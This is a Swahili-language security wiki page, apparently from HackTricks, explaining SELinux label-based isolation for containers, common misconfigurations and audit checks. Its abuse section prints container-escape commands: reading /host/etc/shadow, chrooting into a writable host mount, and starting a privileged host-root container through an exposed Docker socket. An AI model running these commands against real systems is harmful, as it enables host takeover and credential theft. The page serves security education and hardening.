# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Muhtasari

SELinux ni mfumo wa **Mandatory Access Control unaotegemea labels**. Kila process na object husika inaweza kuwa na security context, na policy huamua ni domains zipi zinaweza kuingiliana na types zipi, na kwa njia gani. Katika mazingira ya container, hii kwa kawaida humaanisha kuwa runtime huanzisha container process chini ya container domain iliyozuiwa na ku-label content ya container kwa types zinazolingana. Ikiwa policy inafanya kazi ipasavyo, process inaweza kusoma na kuandika vitu ambavyo label yake inatarajiwa kuvifikia, huku ikizuiwa kufikia content nyingine ya host, hata ikiwa content hiyo itaonekana kupitia mount.

Hii ni mojawapo ya protections zenye nguvu zaidi upande wa host zinazopatikana katika deployments kuu za Linux container. Ni muhimu hasa kwenye Fedora, RHEL, CentOS Stream, OpenShift, na ecosystems nyingine zinazotegemea SELinux. Katika mazingira hayo, reviewer anayepuuza SELinux mara nyingi ataelewa vibaya kwa nini njia inayoonekana wazi ya ku-compromise host kwa kweli imezuiwa.

## AppArmor Vs SELinux

Tofauti rahisi zaidi ya kiwango cha juu ni kwamba AppArmor inategemea paths, wakati SELinux **inategemea labels**. Hilo lina madhara makubwa kwa container security. Policy inayotegemea paths inaweza kufanya kazi kwa njia tofauti ikiwa content ileile ya host itaonekana chini ya mount path isiyotarajiwa. Policy inayotegemea labels, badala yake, huuliza object ina label gani na process domain inaweza kufanya nini juu yake. Hii haifanyi SELinux iwe rahisi, lakini huifanya iwe thabiti dhidi ya aina fulani ya assumptions za path tricks ambazo defenders wakati mwingine huzifanya bila kukusudia kwenye systems zinazotegemea AppArmor.

Kwa kuwa model hii inaelekezwa na labels, utunzaji wa container volumes na maamuzi ya relabeling ni muhimu kwa security. Ikiwa runtime au operator itabadilisha labels kwa upana sana ili "kufanya mounts zifanye kazi", policy boundary iliyokusudiwa ku-contain workload inaweza kuwa dhaifu zaidi kuliko ilivyokusudiwa.

## Lab

Ili kuona ikiwa SELinux iko active kwenye host:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Ili kukagua labels zilizopo kwenye host:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Ili kulinganisha uendeshaji wa kawaida na ule ambao uwekaji wa lebo umezimwa:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Kwenye host iliyo na SELinux, huu ni mfano wa vitendo sana kwa sababu unaonyesha tofauti kati ya workload inayoendeshwa chini ya container domain inayotarajiwa na ile ambayo imeondolewa layer hiyo ya enforcement.

## Matumizi ya Runtime

Podman imepangwa vizuri hasa na SELinux kwenye mifumo ambayo SELinux ni sehemu ya platform default. Rootless Podman pamoja na SELinux ni mojawapo ya misingi imara zaidi ya mainstream container kwa sababu process tayari haina privileges kwenye upande wa host na bado imezuiwa na MAC policy. Docker pia inaweza kutumia SELinux pale inapoungwa mkono, ingawa wakati mwingine administrators hui-disable ili kukabiliana na changamoto za volume-labeling. CRI-O na OpenShift hutegemea sana SELinux kama sehemu ya container isolation yao. Kubernetes pia inaweza kutoa settings zinazohusiana na SELinux, lakini thamani yake bila shaka inategemea ikiwa OS ya node inaunga mkono na kutekeleza SELinux.<sup>[[2]](#references)</sup>

Somo linalojirudia ni kwamba SELinux si mapambo ya hiari. Katika ecosystems zilizojengwa kuizunguka, ni sehemu ya security boundary inayotarajiwa.

## Mipangilio Isiyo Sahihi

Kosa la kawaida ni `label=disable`. Kwa upande wa operations, mara nyingi hili hutokea kwa sababu volume mount imekataliwa, na jibu la haraka la muda mfupi likawa kuiondoa SELinux kwenye equation badala ya kurekebisha labeling model.<sup>[[1]](#references)</sup> Kosa lingine la kawaida ni relabeling isiyo sahihi ya content ya host. Broad relabel operations zinaweza kufanya application ifanye kazi, lakini pia zinaweza kupanua kile container inachoruhusiwa kugusa zaidi sana ya kilichokusudiwa awali.

Ni muhimu pia kutokuchanganya SELinux **iliyowekwa** na SELinux **inayotekelezwa kwa ufanisi**. Host inaweza kuunga mkono SELinux na bado iwe katika permissive mode, au runtime inaweza kuwa haianzishi workload chini ya domain inayotarajiwa. Katika hali hizo, ulinzi huwa dhaifu zaidi kuliko documentation inavyoweza kupendekeza.

## Matumizi Mabaya

SELinux inapokosekana, ikiwa katika permissive mode, au ikiwa ime-disable kwa upana kwa workload, paths zilizomountiwa kutoka kwenye host huwa rahisi zaidi kutumiwa vibaya. Bind mount ileile ambayo kwa kawaida ingezuiwa na labels inaweza kuwa njia ya moja kwa moja ya kufikia data ya host au kufanya mabadiliko kwenye host. Hili ni muhimu hasa linapochanganywa na writable volume mounts, container runtime directories, au operational shortcuts zilizoweka wazi paths nyeti za host kwa ajili ya urahisi.

SELinux mara nyingi hueleza kwa nini generic breakout writeup inafanya kazi mara moja kwenye host moja lakini inashindwa mara kwa mara kwenye nyingine, ingawa runtime flags zinaonekana kufanana. Kitu kinachokosekana mara nyingi si namespace wala capability, bali ni label boundary iliyobaki intact.

Ukaguzi wa haraka zaidi wa vitendo ni kulinganisha active context, kisha kuchunguza mounted host paths au runtime directories ambazo kwa kawaida zingekuwa label-confined:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Ikiwa host bind mount ipo na SELinux labeling imezimwa au kudhoofishwa, information disclosure mara nyingi hutokea kwanza:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Ikiwa mount inaweza kuandikwa na container kimsingi ina mamlaka ya host-root kwa mtazamo wa kernel, hatua inayofuata ni kujaribu modification inayodhibitiwa ya host badala ya kubahatisha:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Kwenye hosts zinazotumia SELinux, kupotea kwa labels kwenye directories za runtime state kunaweza pia kufichua njia za moja kwa moja za privilege-escalation:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Amri hizi hazibadilishi chain kamili ya escape, lakini zinaonyesha haraka sana ikiwa SELinux ndiyo iliyokuwa inazuia ufikiaji wa data ya host au urekebishaji wa faili upande wa host.

### Mfano Kamili: SELinux Imezimwa + Mount ya Host Inayoweza Kuandikwa

Ikiwa SELinux labeling imezimwa na filesystem ya host imewekwa kwa ruhusa ya kuandikwa kwenye `/host`, host escape kamili huwa ni kisa cha kawaida cha matumizi mabaya ya bind-mount:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Ikiwa `chroot` itafanikiwa, mchakato wa container sasa unaendesha kutoka kwenye filesystem ya host:
```bash
id
hostname
cat /etc/passwd | tail
```
### Mfano Kamili: SELinux Imezimwa + Runtime Directory

Ikiwa workload inaweza kufikia runtime socket wakati labels zimezimwa, escape inaweza kukabidhiwa runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Uchunguzi unaofaa ni kwamba SELinux mara nyingi ilikuwa udhibiti uliokuwa ukizuia aina hii hii ya ufikiaji wa host-path au hali ya runtime.

## Ukaguzi

Lengo la ukaguzi wa SELinux ni kuthibitisha kwamba SELinux imewezeshwa, kutambua security context ya sasa, na kuona ikiwa faili au paths unazohitaji kwa kweli zimewekewa kizuizi cha label.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Kinachovutia hapa:

- `getenforce` inapaswa kwa kawaida kurudisha `Enforcing`; `Permissive` au `Disabled` hubadilisha maana ya sehemu nzima ya SELinux.
- Ikiwa process context ya sasa inaonekana isiyotarajiwa au pana kupita kiasi, workload huenda haiendeshwi chini ya container policy iliyokusudiwa.
- Ikiwa files zilizomountiwa kutoka host au runtime directories zina labels ambazo process inaweza kufikia kwa uhuru kupita kiasi, bind mounts huwa hatari zaidi.

Unapokagua container kwenye platform inayotumia SELinux, usichukulie labeling kama jambo la ziada. Mara nyingi ni mojawapo ya sababu kuu zinazofanya host isiwe tayari imecompromiseiwa.

## Runtime Defaults

| Runtime / platform | Hali ya kawaida | Tabia ya kawaida | Udhaifu wa kawaida unaowekwa manually |
| --- | --- | --- | --- |
| Docker Engine | Hutegemea host | SELinux separation inapatikana kwenye hosts zilizoenable SELinux, lakini tabia halisi hutegemea configuration ya host/daemon | `--security-opt label=disable`, relabeling pana ya bind mounts, `--privileged` |
| Podman | Kwa kawaida imeenabled kwenye SELinux hosts | SELinux separation ni sehemu ya kawaida ya Podman kwenye SELinux systems isipokuwa ikiwa imezimwa | `--security-opt label=disable`, `label=false` ndani ya `containers.conf`, `--privileged` |
| Kubernetes | Kwa kawaida haiassigniwi automatically katika kiwango cha Pod | SELinux support ipo, lakini Pods kwa kawaida huhitaji `securityContext.seLinuxOptions` au defaults maalum za platform; support ya runtime na node inahitajika | `seLinuxOptions` dhaifu au pana kupita kiasi, kuendesha kwenye nodes zilizo permissive/disabled, platform policies zinazozima labeling |
| CRI-O / OpenShift style deployments | Kwa kawaida hutegemewa sana | SELinux mara nyingi ni sehemu ya msingi ya node isolation model katika mazingira haya | custom policies zinazopanua access kupita kiasi, kuzima labeling kwa ajili ya compatibility |

SELinux defaults hutegemea distribution zaidi kuliko seccomp defaults. Kwenye systems za mtindo wa Fedora/RHEL/OpenShift, SELinux mara nyingi ni sehemu kuu ya isolation model. Kwenye systems zisizo za SELinux, haipo kabisa.

## Marejeo

- [1] [Podman Documentation: --security-opt=option (label=disable)](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes: Configure a Security Context for a Pod or Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

{{#include ../../../../banners/hacktricks-training.md}}
